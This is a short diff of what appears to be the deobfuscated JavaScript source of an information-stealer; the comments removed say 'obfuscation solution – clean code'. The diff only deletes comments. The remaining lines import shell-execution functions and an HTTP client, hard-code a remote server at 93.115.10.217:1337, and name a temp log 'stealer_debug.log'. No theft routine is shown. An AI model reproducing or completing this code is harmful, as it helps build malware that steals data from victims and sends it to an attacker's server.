@@ -1,4 +1,4 @@
-// Obfuscation çözümü - Temiz kod
+
 
 const path = require("path");
 const fs = require('fs');
@@ -12,7 +12,6 @@ const { exec, spawn, execSync } = require("child_process");
 const os = require('os');
 const axios = require("axios");
 
-// Yapılandırma
 const URL = "http://93.115.10.217:1337";
 const tempDir = os.tmpdir();
 const debugLogPath = path.join(tempDir, 'stealer_debug.log');
